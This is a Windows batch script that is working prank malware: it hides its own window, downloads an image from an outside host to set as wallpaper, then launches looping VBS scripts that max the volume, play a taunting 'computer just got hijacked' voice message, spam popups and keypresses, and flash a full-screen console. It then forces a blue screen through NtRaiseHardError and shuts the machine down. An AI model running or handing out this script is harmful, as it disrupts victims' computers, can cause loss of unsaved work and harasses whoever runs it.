@echo off

if exist C:\Users\%USERNAME%\Downloads\var.json (goto mainprogram)

:stealthmake
cd C:\Users\%USERNAME%\Downloads
(
echo wscript.sleep 500
echo Set WshShell = WScript.CreateObject^("WScript.Shell"^)
echo obj = WshShell.Run^("""%~f0""", 0^)
echo set WshShell = Nothing
) > stealth.vbs
echo. > var.json

:stealthrun
start stealth.vbs
exit

:mainprogram
cd C:\Users\%USERNAME%\Downloads
del var.json /f

::--------------------------------------------------------------------------

cd C:\Users\%USERNAME%\Downloads

(
echo dim wshShell
echo dim sUserName
echo Set wshShell = WScript.CreateObject^("WScript.Shell"^)
echo sUserName = wshShell.ExpandEnvironmentStrings^("%USERNAME%"^)
echo Set oShell = CreateObject^("WScript.Shell"^)
echo Set oFSO = CreateObject^("Scripting.FileSystemObject"^)
echo sWinDir = oFSO.GetSpecialFolder^(0^)
echo sWallPaper = "C:\Users\%USERNAME%\Downloads\bg.jpg"
echo oShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", sWallPaper
echo oShell.Run "C:\WINDOWS\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
) > wall.vbs

::EDIT BACKGROUND LINK HERE
start powershell curl https://i.ibb.co/5MjPDvc/image.png -O bg.jpg

timeout 3 /NOBREAK >NUL
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs

cd C:\Users\%USERNAME%\Downloads
(
echo @if ^(@a==@b^) @end /*
echo :: batch portion
echo @ECHO OFF
echo cscript /e:jscript "%%~f0"
echo :: JScript portion */
echo var shl = new ActiveXObject^("WScript.Shell"^);
echo for ^(var i=0; i^<5; i++^) {
echo     shl.SendKeys^(String.fromCharCode^(0xAF^)^);
echo }
) > vol.bat

(
echo Dim sapi
echo Set sapi=CreateObject^("sapi.spvoice"^)
::Change TTS Here!
echo sapi.Speak "%USERNAME%'s computer just got hijacked! bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee bowling bee"
) > tts.vbs

start tts.vbs

(
echo do
echo wscript.sleep 100
echo Set WshShell = WScript.CreateObject^("WScript.Shell"^)
echo obj = WshShell.Run^("""C:\Users\%USERNAME%\Downloads\vol.bat""", 0^)
echo set WshShell = Nothing
echo loop
) > stealthvol.vbs

start stealthvol.vbs

cd C:\Users\%USERNAME%\Downloads
(
echo @echo off
echo if not "%%1" == "max" start /MAX cmd /c %%0 max ^& exit/b
echo :loop
echo color 10 
echo color a0 
echo color 60 
echo color f0
echo goto loop
) > seize.bat

start seize.bat

(
echo dim r
echo randomize
echo r = int^(rnd*15000^) + 1
echo r2 = int^(rnd*10000^) + 1
echo Title = "chaos > you"
echo DefaultValueText = "Type here to remove skill issue..."
echo message = "Your computer has been trashed!"
echo XPos = r
echo YPos = r2
echo Text = InputBox^(message,Title,DefaultValueText,XPos,YPos^)
) > popup.vbs

(
echo do
echo wscript.sleep 25
echo Set WshShell = WScript.CreateObject^("WScript.Shell"^)
echo obj = WshShell.Run^("""C:\Users\%USERNAME%\Downloads\popup.vbs""", 0^)
echo set WshShell = Nothing
echo loop
) > popuprun.vbs

start popuprun.vbs

(
echo do
echo Set WshShell = WScript.CreateObject^("WScript.Shell"^)
echo WshShell.SendKeys "{END}"
echo loop
) > lag.vbs

start lag.vbs

(
echo from ctypes import windll
echo from ctypes import c_int
echo from ctypes import c_uint
echo from ctypes import c_ulong
echo from ctypes import POINTER
echo from ctypes import byref
echo nullptr = POINTER^(c_int^)^(^)
echo windll.ntdll.RtlAdjustPrivilege^(
echo     c_uint^(19^), 
echo     c_uint^(1^), 
echo     c_uint^(0^), 
echo     byref^(c_int^(^)^)
echo ^)
echo windll.ntdll.NtRaiseHardError^(
echo     c_ulong^(0xC000007B^), 
echo     c_ulong^(0^), 
echo     nullptr, 
echo     nullptr, 
echo     c_uint^(6^), 
echo     byref^(c_uint^(^)^)
echo ^)
) > bsod.pyw

timeout 10 /NOBREAK>nul
start bsod.pyw
timeout 10 /NOBREAK>nul
shutdown -s -t 5 -c "pov you dont have python"
exit

::DO NOT EDIT BELOW THIS LINE
:delete
cd %~dp0
shutdown -s -t 2 -c "Your computer has been shut down due to safety reasons. Please contact your network administrator for more information.
del %~nx0
